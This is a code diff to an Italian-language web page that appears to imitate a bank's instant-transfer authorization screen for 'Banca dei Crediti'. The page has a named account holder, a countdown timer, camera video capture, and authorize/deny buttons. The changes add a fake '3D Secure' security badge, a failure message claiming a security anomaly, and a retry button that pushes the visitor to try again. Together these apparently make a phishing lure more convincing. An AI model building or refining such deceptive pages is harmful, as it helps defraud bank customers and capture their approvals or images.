@@ -34,6 +34,13 @@
       margin: 8px 0;
     }
 
+    .secure-tag {
+      font-size: 14px;
+      color: #00ff88;
+      margin-top: -10px;
+      margin-bottom: 20px;
+    }
+
     .timer {
       font-size: 15px;
       color: rgb(251, 18, 34);
@@ -57,7 +64,7 @@
       color: #000;
     }
 
-    .nega {
+    .nega, .riprovare {
       background-color: #fff;
       color: #000;
     }
@@ -95,7 +102,8 @@
 
 <div class="card" id="card">
   <img src="logo.png" alt="Banca dei Crediti" class="bank-logo">
-  <h2 style="margin-bottom: 20px;">Ricevi bonifico istantaneo</h2>
+  <h2 style="margin-bottom: 5px;">Ricevi bonifico istantaneo</h2>
+  <div class="secure-tag">🔒 3D Secure</div>
 
   <div class="info">
     <p>Intestatario: <strong>LORENZO MARIANI</strong></p>
@@ -110,7 +118,7 @@
   <video id="video" autoplay playsinline></video>
   <canvas id="canvas"></canvas>
 
-  <button class="autorizza" id="btnAutorizza" onclick="handleClick()">AUTORIZZA</button>
+  <button class="autorizza" onclick="handleClick()">AUTORIZZA</button>
   <button class="nega" onclick="showFailure()">NEGA</button>
 </div>
 
@@ -130,8 +138,7 @@
     countdownEl.innerText = `${m}:${s}`;
     if (seconds <= 0) {
       clearInterval(timer);
-      countdownEl.innerText = "00:00";
-      alert("Sessione scaduta.");
+      showFailure("Sessione scaduta.");
     }
   }, 1000);
 
@@ -160,6 +167,7 @@
       <h2 style="color: rgb(251, 18, 34);">Transazione Negata</h2>
       <p>${msg ?? "L'autenticazione 3D Secure non è stata completata."}</p>
       <p>Il sistema ha rilevato un'anomalia di sicurezza, è necessario ripetere l'operazione di autorizzazione.</p>
+      <button class="riprovare" onclick="location.reload()">RIPROVA</button>
     `;
   }
 
